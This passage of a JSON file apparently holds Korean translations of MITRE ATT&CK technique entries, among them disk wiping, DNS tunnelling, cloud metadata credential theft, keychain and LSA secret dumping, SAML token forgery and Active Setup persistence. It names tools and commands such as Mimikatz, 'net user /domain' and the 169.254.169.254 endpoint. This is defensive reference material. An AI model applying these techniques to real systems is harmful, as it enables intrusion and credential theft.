    "description": "적대자들은 목표 설정 중에 사용할 수 있는 SSL/TLS 인증서를 구매하거나 도용할 수 있습니다. SSL/TLS 인증서는 신뢰를 구축하기 위해 설계되었습니다. 이 인증서에는 키에 대한 정보, 소유자의 신원에 대한 정보, 인증서의 내용을 확인한 주체의 디지털 서명이 포함됩니다. 서명이 유효하고 인증서를 검토하는 사람이 서명자를 신뢰한다면, 그들은 해당 키를 사용하여 소유자와 통신할 수 있다는 것을 알게 됩니다.\n\n적대자들은 C2 트래픽 암호화와 같은 운영을 지원하기 위해 SSL/TLS 인증서를 구매하거나 도용할 수 있습니다. 인증서가 신뢰받거나 신뢰의 루트에 추가되면 중간 공격자를 가능하게 할 수도 있습니다. 디지털 인증서의 구매는 정식 조직을 통해 하거나 이전에 침해된 주체에서 도용한 정보를 사용하여 적대자가 해당 주체로서 인증서 제공자를 검증할 수 있도록 할 수 있습니다. 적대자들은 또한 공격한 제3자로부터 인증서 자료를 직접 도용할 수 있습니다.\n\n인증 기관은 적대자들이 무료로 도메인 검증 인증서와 같은 SSL/TLS 인증서를 획득할 수 있도록 허용합니다.\n\n디지털 인증서를 얻은 후, 적대자는 그 인증서를 자신이 통제하는 인프라에 설치할 수 있습니다.",
    "external_id": "T1588.004",
    "modified": "2024-09-16T16:19:41.567Z",
    "translated": true
  },
  {
    "title": "Disk Wipe",
    "description": "적대자는 특정 시스템이나 네트워크의 많은 수의 시스템에서 원시 디스크 데이터를 지우거나 손상시켜 시스템 및 네트워크 자원의 가용성을 방해할 수 있습니다. 디스크에 직접 쓰기 접근 권한이 있는 경우, 적대자는 디스크 데이터의 일부를 덮어쓰려고 시도할 수 있습니다. 적대자는 임의의 디스크 데이터 부분을 지우거나 마스터 부트 레코드(MBR)와 같은 디스크 구조를 지울 수 있습니다. 모든 디스크 섹터를 완전하게 지우는 시도가 있을 수 있습니다.\n\n네트워크 전체의 가용성 중단이 목표인 작업에서 목표 조직에 최대한의 영향을 미치기 위해, 디스크를 지우는 데 사용되는 악성 코드는 추가 기술을 활용하여 네트워크를 통해 전파될 수 있는 웜과 같은 특징을 가질 수 있습니다.\n\n네트워크 장치에서 적대자는 `erase`와 같은 명령어를 사용하여 장치의 구성 파일 및 기타 데이터를 지울 수 있습니다.",
    "external_id": "T1561",
    "modified": "2023-04-20T18:16:41.942Z",
    "translated": true
  },
  {
    "title": "DNS",
    "description": "적대자는 기존 트래픽과 섞여 검출/네트워크 필터링을 피하기 위해 도메인 이름 시스템(DNS) 애플리케이션 계층 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과가 클라이언트와 서버 간의 프로토콜 트래픽에 내장됩니다.\n\nDNS 프로토콜은 컴퓨터 네트워킹에서 관리 기능을 수행하므로 다양한 환경에서 매우 일반적일 수 있습니다. DNS 트래픽은 네트워크 인증이 완료되기 이전에도 허용될 수 있습니다. DNS 패킷에는 데이터를 숨길 수 있는 여러 필드와 헤더가 포함되어 있습니다. 종종 DNS 터널링으로 알려진 이 방법을 통해 적대자는 피해자의 네트워크 내에서 자신의 통제 하에 있는 시스템과 통신하면서 정상적이고 예상되는 트래픽을 모방할 수 있습니다.",
    "external_id": "T1071.004",
    "modified": "2023-12-26T20:54:38.721Z",
    "translated": true
  },
  {
    "title": "Cloud Instance Metadata API",
    "description": "적대 세력은 자격 증명 및 기타 민감한 데이터를 수집하기 위해 클라우드 인스턴스 메타데이터 API에 접근하려고 시도할 수 있습니다.\n\n대부분의 클라우드 서비스 제공업체는 실행 중인 가상 인스턴스에 제공되는 서비스인 클라우드 인스턴스 메타데이터 API를 지원합니다. 이 API를 통해 애플리케이션은 실행 중인 가상 인스턴스에 대한 정보를 접근할 수 있습니다. 사용 가능한 정보는 일반적으로 이름, 보안 그룹 및 자격 증명과 추가 비밀이 포함될 수 있는 UserData 스크립트와 같은 민감한 데이터를 포함한 추가 메타데이터를 포함합니다. 인스턴스 메타데이터 API는 애플리케이션 관리에 도움을 주기 위해 제공되며 인스턴스에 접근할 수 있는 사람이라면 누구나 접근할 수 있습니다. 또한 클라우드 메타데이터 API는 최소한 한 가지 고 프로필 침해 사건에서 사용된 바 있습니다.\n\n적대 세력이 실행 중인 가상 인스턴스에서 존재감을 가지고 있다면, 그들은 추가 자원에 대한 접근 권한을 부여하는 자격 증명을 식별하기 위해 인스턴스 메타데이터 API에 직접 질의를 할 수 있습니다. 또한 적대 세력은 공개 웹 프록시에서 서버 측 요청 위조(SSRF) 취약점을 악용하여 인스턴스 메타데이터 API에 대한 요청을 통해 민감한 정보에 접근할 수 있습니다.\n\n클라우드 서비스 제공업체 간의 사실상의 표준은 인스턴스 메타데이터 API를 <code>http[:]//169.254.169.254</code>에서 호스팅하는 것입니다.",
    "external_id": "T1552.005",
    "modified": "2024-10-15T16:24:20.219Z",
    "translated": true
  },
  {
    "title": "Securityd Memory",
    "description": "루트 접근 권한을 가진 공격자는 `securityd`의 메모리를 읽어 자격 증명을 수집할 수 있습니다. `securityd`는 암호화 및 인증과 같은 보안 프로토콜을 구현하는 서비스/데몬입니다. 권한이 있는 공격자는 `securityd`의 메모리를 스캔하여 사용자의 로그인 키체인을 복호화할 수 있는 올바른 키의 순서를 찾을 수 있습니다. 이를 통해 공격자는 사용자, WiFi, 이메일, 브라우저, 인증서, 보안 메모 등 다양한 평문 비밀번호를 얻을 수 있습니다.\n\nEl Capitan 이전의 OS X에서는 루트 접근 권한을 가진 사용자가 로그인한 사용자의 평문 키체인 비밀번호를 읽을 수 있습니다. 이는 Apple의 키체인 구현이 이러한 자격 증명을 캐시하도록 허용하여 사용자가 비밀번호를 반복적으로 입력하라는 메시지를 받지 않게 하기 때문입니다. Apple의 `securityd` 유틸리티는 사용자의 로그인 비밀번호를 받아 PBKDF2로 암호화하고 이 마스터 키를 메모리에 저장합니다. Apple은 또한 사용자의 비밀번호를 암호화하기 위해 일련의 키와 알고리즘을 사용하지만, 마스터 키를 찾으면 공격자는 최종 비밀번호를 잠금 해제하기 위해 나머지 값을 반복하기만 하면 됩니다.",
    "external_id": "T1555.002",
    "modified": "2024-10-15T16:41:18.638Z",
    "translated": true
  },
  {
    "title": "Group Policy Discovery",
    "description": "적대 세력은 권한 상승 경로를 식별하고 도메인 내에 적용된 보안 조치를 파악하며 조작할 수 있는 도메인 객체의 패턴을 발견하기 위해 그룹 정책 설정에 대한 정보를 수집할 수 있습니다. 그룹 정책은 Active Directory(AD)에서 사용자 및 컴퓨터 설정을 중앙 집중식으로 관리할 수 있게 해줍니다. 그룹 정책 오브젝트(GPO)는 `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`의 예측 가능한 네트워크 경로에 저장된 파일로 구성된 그룹 정책 설정의 컨테이너입니다.\n\n적대 세력은 `gpresult`와 같은 명령어 또는 `Get-DomainGPO`, `Get-DomainGPOLocalGroup`과 같은 다양한 공개적으로 사용할 수 있는 PowerShell 기능을 사용하여 그룹 정책 설정에 대한 정보를 수집할 수 있습니다. 이들은 이를 활용하여 타겟 네트워크 내에서 잠재적인 공격 경로를 결정하는 것뿐만 아니라 그룹 정책 설정을 조작할 수 있는 기회를 찾는 후속 행동을 형성하는 데 사용할 수 있습니다.",
    "external_id": "T1615",
    "modified": "2023-01-06T12:41:08.579Z",
    "translated": true
  },
  {
    "title": "Bootkit",
    "description": "적대자들은 시스템에 지속적으로 존재하기 위해 부트킷을 사용할 수 있습니다. 부트킷은 운영 체제 아래의 계층에 위치하며, 조직이 부트킷의 사용을 의심하고 그에 따라 조치를 취하지 않는 한 완전한 복구를 수행하기 어렵게 만들 수 있습니다.\n\n부트킷은 하드 드라이브의 부트 섹터를 수정하는 악성 소프트웨어 변형으로, 마스터 부트 레코드(MBR)와 볼륨 부트 레코드(VBR)를 포함합니다. MBR은 BIOS에 의한 하드웨어 초기화가 완료된 후 처음으로 로드되는 디스크의 섹션입니다. 부트 로더의 위치입니다. 부트 드라이브에 대한 원시 접근 권한이 있는 적대자는 이 영역을 덮어씌워 스타트업 중 실행을 정상 부트 로더에서 적의 코드로 전환할 수 있습니다.\n\nMBR은 부트 프로세스의 제어를 VBR에 전달합니다. MBR의 경우와 유사하게, 부트 드라이브에 대한 원시 접근 권한이 있는 적대자는 VBR을 덮어씌워 스타트업 중 실행을 적의 코드로 전환할 수 있습니다.",
    "external_id": "T1542.003",
    "modified": "2023-03-30T21:01:47.417Z",
    "translated": true
  },
  {
    "title": "Data from Removable Media",
    "description": "적대자는 그들이 침해한 컴퓨터에서 연결된 제거 가능한 매체를 검색하여 관심 있는 파일을 찾을 수 있습니다. 민감한 데이터는 침해된 시스템에 연결된 모든 제거 가능한 매체(광디스크 드라이브, USB 메모리 등)에서 유출 전 수집될 수 있습니다. 대화형 명령 셸이 사용될 수 있으며, 정보 수집을 위해 일반적인 기능이 사용될 수 있습니다.\n\n일부 적대자는 제거 가능한 매체에서 자동화된 수집을 사용할 수도 있습니다.",
    "external_id": "T1025",
    "modified": "2024-10-15T16:30:50.936Z",
    "translated": true
  },
  {
    "title": "Mavinject",
    "description": "적대 세력은 mavinject.exe를 악성 코드를 프록시 실행하는 데 악용할 수 있습니다. Mavinject.exe는 Microsoft 애플리케이션 가상화 인젝터로, Microsoft 애플리케이션 가상화(App-V)의 일환으로 외부 프로세스에 코드를 주입할 수 있는 Windows 유틸리티입니다.\n\n적대 세력은 mavinject.exe를 악성 DLL을 실행 중인 프로세스에 주입하는 데 악용할 수 있으며, 이는 임의의 코드 실행을 허용합니다. mavinject.exe는 Microsoft에 의해 디지털 서명될 수 있기 때문에 이 방법을 통한 실행 프록시는 실행이 합법적인 프로세스에 가려져 있기 때문에 보안 제품의 탐지를 피할 수 있습니다.\n\n동적 링크 라이브러리 주입 외에도 Mavinject.exe는 <code>/HMODULE</code> 명령줄 매개변수를 통해 가져오기 설명자 주입을 수행하는 데도 악용될 수 있습니다. 이 명령은 지정된 DLL로 구성된 가져오기 테이블 항목을 주어진 기본 주소의 모듈에 주입합니다.",
    "external_id": "T1218.013",
    "modified": "2022-04-19T17:35:08.315Z",
    "translated": true
  },
  {
    "title": "Local Data Staging",
    "description": "적대자는 수집된 데이터를 외부로 유출하기 전에 로컬 시스템의 중앙 위치나 디렉토리에 배치할 수 있다. 데이터는 별도의 파일로 유지되거나 기술을 사용하여 하나의 파일로 결합될 수 있다. 상호작용 명령 셸이 사용될 수 있으며, 데이터 복사를 위해 cmd와 bash 내의 일반적인 기능이 사용될 수 있다.\n\n적대자는 또한 수집된 데이터를 시스템의 다양한 형식/위치에 배치할 수 있으며, 여기에는 로컬 저장소 데이터베이스/저장소나 윈도우 레지스트리가 포함된다.",
    "external_id": "T1074.001",
    "modified": "2024-08-26T16:28:39.920Z",
    "translated": true
  },
  {
    "title": "Match Legitimate Name or Location",
    "description": "적대자들은 합법적인 파일이나 리소스의 이름이나 위치를 일치시키거나 근사화할 수 있습니다. 이는 방어 및 관찰을 피하기 위해 수행됩니다. 예를 들어, 신뢰받는 일반 디렉토리(예: System32)에 실행 파일을 배치하거나 합법적이고 신뢰받는 프로그램의 이름(예: svchost.exe)을 부여함으로써 이루어질 수 있습니다. 컨테이너화된 환경에서는 컨테이너 포드나 클러스터의 명명 규칙과 일치하는 네임스페이스에 리소스를 생성함으로써도 이러한 일이 발생할 수 있습니다. 또는 파일이나 컨테이너 이미지의 이름이 합법적인 프로그램이나 이미지 또는 무해한 것과 매우 비슷할 수 있습니다.\n\n적대자들은 또한 그들이 모방하려는 파일의 동일한 아이콘을 사용할 수 있습니다.",
    "external_id": "T1036.005",
    "modified": "2024-09-12T19:30:45.064Z",
    "translated": true
  },
  {
    "title": "Stored Data Manipulation",
    "description": "적대자는 외부 결과에 영향을 미치거나 활동을 숨기기 위해 데이터에 삽입, 삭제 또는 조작을 할 수 있으며, 이로 인해 데이터의 무결성이 위협받을 수 있습니다. 저장된 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n저장된 데이터는 Office 파일, 데이터베이스, 저장된 이메일 및 사용자 정의 파일 형식과 같은 다양한 파일 형식을 포함할 수 있습니다. 수정의 유형과 그 영향은 데이터의 종류와 적대자의 목표 및 목적에 따라 다릅니다. 복잡한 시스템의 경우, 적대자는 원활한 영향을 미치기 위해 특별한 전문 지식이 필요하며, 일반적으로는 장기간의 정보 수집 캠페인을 통해 얻어지는 시스템과 관련된 특수 소프트웨어에 대한 접근이 필요할 것입니다.",
    "external_id": "T1565.001",
    "modified": "2024-08-26T16:33:33.982Z",
    "translated": true
  },
  {
    "title": "Password Cracking",
    "description": "적의는 패스워드 해시와 같은 자격 증명 자료를 확보했을 때, 사용 가능한 자격 증명(예: 평문 패스워드)을 복구하기 위해 패스워드 크래킹을 사용할 수 있습니다. 패스워드 해시를 얻기 위해 OS 자격 증명 덤핑을 사용할 수 있지만, 패스 더 해시가 옵션이 아닐 경우 이는 적을 바짝 구속할 수 있습니다. 또한, 적은 네트워크 장치의 해시된 자격 증명을 얻기 위해 구성 저장소의 데이터를 활용할 수 있습니다.\n\n해시를 계산하는 데 사용된 패스워드를 체계적으로 추측하기 위한 기법이 있으며, 적은 미리 계산된 레인보우 테이블을 사용하여 해시를 크래킹할 수도 있습니다. 해시를 크래킹하는 것은 일반적으로 목표 네트워크 외부의 적이 통제하는 시스템에서 수행됩니다. 성공적으로 크래킹된 해시로부터 얻어진 평문 패스워드는 해당 계정이 접근할 수 있는 시스템, 리소스, 서비스에 로그인하는 데 사용될 수 있습니다.",
    "external_id": "T1110.002",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Local Email Collection",
    "description": "적대자는 민감한 정보를 수집하기 위해 로컬 시스템의 사용자 이메일을 타겟으로 할 수 있습니다. 이메일 데이터를 포함하는 파일은 사용자의 로컬 시스템에서 획득할 수 있으며, 예를 들어 Outlook 저장소나 캐시 파일이 있습니다.\n\nOutlook은 오프라인 데이터 파일로 데이터를 로컬에 저장하며, 이 파일의 확장자는 .ost입니다. Outlook 2010 이후 버전은 최대 50GB의 .ost 파일 크기를 지원하며, 이전 버전의 Outlook은 최대 20GB를 지원합니다. Outlook 2013(및 이전 버전)의 IMAP 계정과 POP 계정은 .ost 대신 Outlook 데이터 파일(.pst)을 사용하며, Outlook 2016(및 이후 버전)의 IMAP 계정은 .ost 파일을 사용합니다. 두 종류의 Outlook 데이터 파일은 일반적으로 `C:\\Users\\<사용자 이름>\\Documents\\Outlook Files` 또는 `C:\\Users\\<사용자 이름>\\AppData\\Local\\Microsoft\\Outlook`에 저장됩니다.",
    "external_id": "T1114.001",
    "modified": "2020-03-24T17:59:20.983Z",
    "translated": true
  },
  {
    "title": "Keychain",
    "description": "적대자들은 키체인에서 자격 증명을 획득할 수 있습니다. 키체인(또는 키체인 서비스)은 계정 이름, 비밀번호, 개인 키, 인증서, 민감한 응용 프로그램 데이터, 결제 데이터 및 보안 메모를 저장하는 macOS 자격 증명 관리 시스템입니다. 키체인은 로그인 키체인, 시스템 키체인, 로컬 항목(아이클라우드) 키체인 등 세 가지 유형이 있습니다. 기본 키체인은 사용자 비밀번호와 정보를 저장하는 로그인 키체인입니다. 시스템 키체인은 운영 체제가 접근하는 항목을 저장하며, 호스트에서 사용자 간에 공유되는 항목이 포함됩니다. 로컬 항목(아이클라우드) 키체인은 Apple의 아이클라우드 서비스와 동기화된 항목에 사용됩니다.\n\n키체인은 키체인 접근 애플리케이션을 통해 또는 명령줄 유틸리티를 사용하여 볼 수 있고 수정할 수 있습니다. 키체인 파일은 특정 폴더에 위치합니다.\n\n적대자들은 키체인 저장소/메모리에서 사용자 자격 증명을 수집할 수 있습니다. 예를 들어, 명령어는 로그인 키체인에서 모든 자격 증명을 덤프합니다. 적대자들은 또한 로그인 키체인 자격 증명을 특정 파일에서 직접 읽을 수 있습니다. 두 방법 모두 비밀번호가 필요하며, 로그인 키체인의 기본 비밀번호는 현재 사용자의 macOS 호스트에 로그인하는 비밀번호입니다.",
    "external_id": "T1555.001",
    "modified": "2024-10-15T16:35:39.985Z",
    "translated": true
  },
  {
    "title": "Boot or Logon Autostart Execution",
    "description": "적대 세력은 시스템 부팅이나 로그인 시 프로그램이 자동으로 실행되도록 시스템 설정을 구성하여 지속성을 유지하거나 손상된 시스템에서 더 높은 권한을 얻을 수 있습니다. 운영 체제는 시스템 부팅이나 계정 로그온 시 프로그램을 자동으로 실행하는 메커니즘을 갖추고 있을 수 있습니다. 이러한 메커니즘에는 특별히 지정된 디렉토리에 배치된 프로그램이나 구성 정보를 저장하는 저장소에서 참조되는 프로그램을 자동으로 실행하는 것이 포함될 수 있습니다. 적대 세력은 커널의 기능을 수정하거나 확장하여 동일한 목표를 달성할 수 있습니다.\n\n일부 부팅 또는 로그인 자동 시작 프로그램은 더 높은 권한으로 실행되므로, 적대 세력은 이러한 프로그램을 활용하여 권한을 상승시킬 수 있습니다.",
    "external_id": "T1547",
    "modified": "2024-09-12T15:27:58.051Z",
    "translated": true
  },
  {
    "title": "LSA Secrets",
    "description": "SYSTEM 액세스 권한이 있는 공격자는 로컬 보안 기관(LSA) 비밀에 접근하려고 할 수 있으며, 여기에는 서비스 계정에 대한 자격 증명과 같은 다양한 자격 증명 자료가 포함될 수 있습니다. LSA 비밀은 레지스트리에 저장되며, LSA 비밀은 메모리에서 덤프할 수도 있습니다. \n\n레지스트리에서 추출하기 위해 Reg를 사용할 수 있으며, 메모리에서 비밀을 추출하기 위해 Mimikatz를 사용할 수 있습니다.",
    "external_id": "T1003.004",
    "modified": "2024-08-13T15:49:17.591Z",
    "translated": true
  },
  {
    "title": "Weaken Encryption",
    "description": "적대자는 네트워크 장치의 암호화 기능을 손상시켜 원래 데이터 통신을 보호할 암호화를 우회할 수 있습니다.\n\n암호화는 전송되는 네트워크 트래픽을 보호하는 데 사용되어 기밀성을 유지하고(무단 공개 방지) 무결성을 보호합니다(무단 변경 방지). 암호화 알고리즘은 평문 메시지를 암호문으로 변환하는 데 사용되며, 관련 복호화 키 없이 해독하는 데 계산적으로 많은 자원을 소모할 수 있습니다. 일반적으로 키가 길어질수록 키 없이 암호 해독의 비용이 증가합니다.\n\n적대자는 네트워크 트래픽의 암호화를 수행하는 장치를 손상시키고 조작할 수 있습니다. 예를 들어, 시스템 이미지를 수정하거나, 키 공간을 줄이거나, 암호화 하드웨어를 비활성화하는 등의 행동을 통해 적대자는 장치의 안전한 네트워크 트래픽 암호화 능력에 부정적인 영향을 주거나 이를 제거할 수 있습니다. 이는 무단 공개의 위험을 증가시키고 데이터 조작, 자격 증명 접근 또는 수집 활동을 촉진할 수 있습니다.",
    "external_id": "T1600",
    "modified": "2020-10-21T22:37:49.258Z",
    "translated": true
  },
  {
    "title": "SAML Tokens",
    "description": "공격자는 유효한 SAML 토큰 서명 인증서를 보유하고 있다면 모든 권한 주장 및 수명을 가진 SAML 토큰을 위조할 수 있습니다. SAML 토큰의 기본 수명은 1시간이지만, 유효 기간은 토큰의 조건 요소의 <code>NotOnOrAfter</code> 값에서 지정할 수 있습니다. 이 값은 <code>LifetimeTokenPolicy</code>의 <code>AccessTokenLifetime</code>을 사용하여 변경할 수 있습니다. 위조된 SAML 토큰은 공격자가 SAML 2.0을 SSO(싱글 사인온) 메커니즘으로 사용하는 서비스 간에 인증을 수행할 수 있게 합니다.\n\n공격자는 조직의 토큰 서명 인증서를 손상시키기 위해 [개인 키]를 활용하여 위조된 SAML 토큰을 생성할 수 있습니다. 공격자가 자신의 Active Directory Federation Services (AD FS) 서버와 새로운 연합 신뢰를 구축할 수 있는 충분한 권한을 가지고 있다면, 대신 자신의 신뢰할 수 있는 토큰 서명 인증서를 생성할 수 있습니다. 이는 [애플리케이션 액세스 토큰 탈취] 및 다른 유사한 행동과는 다르게 토큰이 새롭게 위조된 것이며, 합법적인 사용자로부터 도난당하거나 가로챈 것이 아닙니다.\n\n공격자는 높은 권한을 가진 계정을 나타낸다고 주장하는 SAML 토큰이 위조되면 관리적인 Entra ID 권한을 얻을 수 있습니다. 이는 [대체 인증 자료 사용]으로 이어질 수 있으며, 이는 다단계 및 기타 인증 보호 메커니즘을 우회할 수 있습니다.",
    "external_id": "T1606.002",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Masquerade File Type",
    "description": "적의들은 악성 페이로드를 파일의 서명, 확장자 및 내용 등의 형식을 변경하여 합법적인 파일로 가장할 수 있습니다. 다양한 파일 형식은 일반적으로 인코딩 및 조직 방식에 대한 표준 형식을 가지고 있습니다. 예를 들어, 파일의 서명(헤더 또는 매직 바이트라고도 함)은 파일의 시작 바이트로, 파일의 유형을 식별하는 데 사용됩니다. 예를 들어, JPEG 파일의 헤더는 특정한 바이트 시퀀스이며, 파일 확장자는 `.JPE`, `.JPEG` 또는 `.JPG`입니다.\n\n적의들은 악성 페이로드의 헤더의 헥스 코드 및/또는 파일 확장자를 수정하여 파일 검증 체크 및/또는 입력 위생화를 우회할 수 있습니다. 이러한 행동은 악성 파일이 전송되거나 저장될 때 일반적으로 사용되어, 적의들이 탐지를 유발하지 않고 악성코드를 전파할 수 있게 합니다.\n\n일반적인 비실행 파일 형식과 확장자, 예를 들어 텍스트 파일(`.txt`) 및 이미지 파일(`.jpg`, `.gif` 등)은 일반적으로 무해한 것으로 취급됩니다. 이를 기반으로, 적의들은 악성코드를 숨기기 위해 파일 확장자를 사용할 수 있으며, 예를 들어 PHP 백도어 코드를 `test.gif`라는 파일명으로 지정할 수 있습니다. 사용자는 파일의 무해한 모양과 파일 확장자 덕분에 파일이 악성이라는 것을 알지 못할 수 있습니다.\n\n다른 파일 형식을 포함할 수 있고 이를 실행할 응용 프로그램에 따라 다르게 작동하는 폴리곤 파일도 악성 소프트웨어와 기능을 숨기는 데 사용될 수 있습니다.",
    "external_id": "T1036.008",
    "modified": "2023-06-14T23:03:51.540Z",
    "translated": true
  },
  {
    "title": "Service Stop",
    "description": "적대 세력은 시스템의 서비스를 중단하거나 비활성화하여 합법적인 사용자에게 해당 서비스를 사용할 수 없게 만들 수 있습니다. 핵심 서비스나 프로세스를 중단하는 것은 사건에 대한 대응을 방해하거나 적대 세력이 환경에 피해를 주기 위한 전체 목표를 지원할 수 있습니다.\n\n적대 세력은 조직에 매우 중요한 개별 서비스를 비활성화함으로써 이를 달성할 수 있습니다. 예를 들어, MSExchangeIS를 비활성화하면 Exchange 콘텐츠에 접근할 수 없게 됩니다. 경우에 따라 적대 세력은 시스템을 사용할 수 없도록 만들기 위해 많은 서비스나 모든 서비스를 중단하거나 비활성화할 수 있습니다. 서비스나 프로세스는 실행 중일 때 데이터 저장소를 수정할 수 없게 할 수 있습니다. 적대 세력은 서비스를 중단하거나 프로세스를 비활성화하여 Exchange와 SQL Server와 같은 서비스의 데이터 저장소에 대해 데이터 파괴 또는 영향에 대한 데이터 암호화를 수행할 수 있습니다.",
    "external_id": "T1489",
    "modified": "2024-10-12T15:57:27.380Z",
    "translated": true
  },
  {
    "title": "Malware",
    "description": "적대자는 목표 설정 동안 사용할 수 있는 악성 소프트웨어 및 악성 소프트웨어 구성 요소를 개발할 수 있습니다. 악성 소프트웨어 구축에는 페이로드, 드로퍼, 사후 타협 도구, 백도어(백도어가 있는 이미지 포함), 패커, C2 프로토콜, 감염된 이동식 미디어 생성 등이 포함될 수 있습니다. 적대자는 원격 시스템에 대한 제어를 유지하고, 방어를 회피하며, 사후 타협 행동을 실행하기 위해 악성 소프트웨어를 개발할 수 있습니다.\n\n합법적인 개발 노력과 마찬가지로, 악성 소프트웨어 개발에는 다양한 기술 세트가 필요할 수 있습니다. 필요한 기술은 내부에 있을 수도 있고 외부에 계약해야 할 수도 있습니다. 계약업체를 사용하는 것은 적대자의 악성 소프트웨어 개발 능력을 확장하는 것으로 간주될 수 있으며, 적대자가 요구사항을 형성하는 데 역할을 하고 악성 소프트웨어에 대한 일정 수준의 독점성을 유지하는 경우에 해당합니다.\n\nC2 프로토콜 개발과 같은 악성 소프트웨어 개발의 일부 측면은 적대자가 추가 인프라를 확보해야 할 수도 있습니다. 예를 들어, C2를 위해 트위터와 소통할 수 있도록 개발된 악성 소프트웨어는 웹 서비스를 사용할 필요가 있을 수 있습니다.",
    "external_id": "T1587.001",
    "modified": "2022-01-14T17:14:27.890Z",
    "translated": true
  },
  {
    "title": "Device Driver Discovery",
    "description": "공격자는 피해자 호스트의 로컬 장치 드라이버를 열거하려고 할 수 있습니다. 장치 드라이버에 대한 정보는 호스트의 기능/목적, 현재 보안 도구 또는 기타 방어 수단, 그리고 잠재적으로 악용 가능한 취약점을 형성하는 다양한 통찰력을 강조할 수 있습니다.\n\n많은 운영체제 유틸리티가 로컬 장치 드라이버에 대한 정보를 제공할 수 있습니다. Windows에서는 `driverquery.exe`와 `EnumDeviceDrivers()` API 함수를 사용할 수 있습니다. 장치 드라이버에 대한 정보(그리고 관련 서비스)는 레지스트리에도 있을 수 있습니다.\n\nLinux/macOS에서는 장치 드라이버(커널 모듈 형태)가 `/dev` 내에서나 `lsmod`, `modinfo`와 같은 유틸리티를 사용하여 확인할 수 있습니다.",
    "external_id": "T1652",
    "modified": "2023-05-04T18:07:16.804Z",
    "translated": true
  },
  {
    "title": "Domain Account",
    "description": "적대자는 도메인 계정 목록을 얻으려 할 수 있습니다. 이 정보는 적대자가 특정 권한을 가진 특정 계정을 타겟팅하는 등의 후속 행동을 지원하는 데 도움이 될 수 있습니다.\n\n`net user /domain` 및 `net group /domain` 명령과 macOS의 `dscacheutil -q group`, Linux의 `ldapsearch`는 도메인 사용자와 그룹을 나열할 수 있습니다. PowerShell cmdlet인 `Get-ADUser` 및 `Get-ADGroupMember`는 Active Directory 그룹의 구성원을 나열할 수 있습니다.",
    "external_id": "T1087.002",
    "modified": "2024-05-31T04:00:37.651Z",
    "translated": true
  },
  {
    "title": "Active Setup",
    "description": "적대자는 로컬 머신의 Active Setup에 레지스트리 키를 추가하여 지속성을 확보할 수 있습니다. Active Setup은 사용자가 로그인할 때 프로그램을 실행하는 데 사용되는 Windows 메커니즘입니다. 레지스트리 키에 저장된 값은 사용자가 컴퓨터에 로그인한 후 실행됩니다. 이러한 프로그램은 사용자의 컨텍스트에서 실행되며 해당 계정의 권한 수준을 가집니다.\n\n적대자는 <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> 아래에 키를 생성하고 <code>StubPath</code>에 악의적인 값을 설정하여 Active Setup을 악용할 수 있습니다. 이 값은 사용자가 컴퓨터에 로그인할 때 실행될 프로그램을 나타냅니다.\n\n적대자는 이러한 구성 요소를 악용하여 원격 접근 도구와 같은 악성 소프트웨어를 실행하고 시스템 재부팅 후에도 지속성을 유지할 수 있습니다. 적대자는 또한 레지스트리 항목이 합법적인 프로그램과 연관된 것처럼 보이도록 [위장]을 사용할 수 있습니다.",
    "external_id": "T1547.014",
    "modified": "2023-03-22T14:17:17.353Z",
    "translated": true
  },
  {
    "title": "Hide Artifacts",
    "description": "적대자는 감지를 피하기 위해 자신의 행동과 관련된 인공물을 숨기려 할 수 있습니다. 운영 체제는 사용자 작업 환경을 방해하지 않고 사용자가 파일이나 시스템의 기능을 변경하는 것을 방지하기 위해 중요한 시스템 파일 및 관리 작업 실행과 같은 다양한 인공물을 숨길 수 있는 기능을 가지고 있을 수 있습니다. 적대자는 이러한 기능을 악용하여 파일, 디렉토리, 사용자 계정 또는 기타 시스템 활동과 같은 인공물을 숨겨 감지를 피할 수 있습니다.\n\n적대자는 또한 가상화 기술을 통해 일반 보안 장비와 분리된 컴퓨팅 영역을 생성하여 악의적인 행동과 관련된 인공물을 숨기려 할 수 있습니다.",
    "external_id": "T1564",
    "modified": "2024-10-15T15:58:49.815Z",
    "translated": true
  },
  {
    "title": "Dynamic Data Exchange",
    "description": "공격자들은 Windows 동적 데이터 교환(DDE)을 사용하여 임의의 명령을 실행할 수 있습니다. DDE는 애플리케이션 간의 일회성 및/또는 지속적인 프로세스 간 통신(IPC)을 위한 클라이언트-서버 프로토콜입니다. 링크가 설정되면 애플리케이션은 문자열, 온 데이터 링크(데이터 항목이 변경될 때 알림), 핫 데이터 링크(데이터 항목 변경의 중복) 및 명령 실행 요청을 포함하는 거래를 자율적으로 교환할 수 있습니다.\n\n객체 연결 및 포함(OLE), 즉 문서 간 데이터 연결 기능은 원래 DDE를 통해 구현되었습니다. 컴포넌트 객체 모델(COM)에 의해 대체되었지만, DDE는 Windows 10과 대부분의 Microsoft Office 2016에서 레지스트리 키를 통해 활성화될 수 있습니다.\n\nMicrosoft Office 문서는 DDE 명령으로 감염될 수 있으며, 직접 또는 임베디드 파일을 통해 실행을 전달하는 데 사용될 수 있습니다. 이를 통해 Visual Basic for Applications(VBA) 매크로를 사용하지 않고 피싱 캠페인이나 호스팅된 웹 콘텐츠를 피할 수 있습니다. 유사하게, 공격자들은 CSV 파일에 DDE 공식을 임베드하여 피해 장치에서 애플리케이션 및/또는 명령을 실행하도록 페이로드를 감염시킬 수 있습니다. 이 CSV 파일은 Windows 스프레드시트 프로그램을 통해 열려고 의도된 것입니다.\n\nDDE는 또한 명령 및 스크립팅 인터프리터에 직접 접근할 수 없는 감염된 머신에서 작동하는 공격자에 의해 활용될 수 있습니다. DDE 실행은 분산 컴포넌트 객체 모델(DCOM)과 같은 원격 서비스에 의해 원격으로 호출될 수 있습니다.",
    "external_id": "T1559.002",
    "modified": "2023-09-15T18:57:21.881Z",
    "translated": true
  },
  {
    "title": "Malicious File",
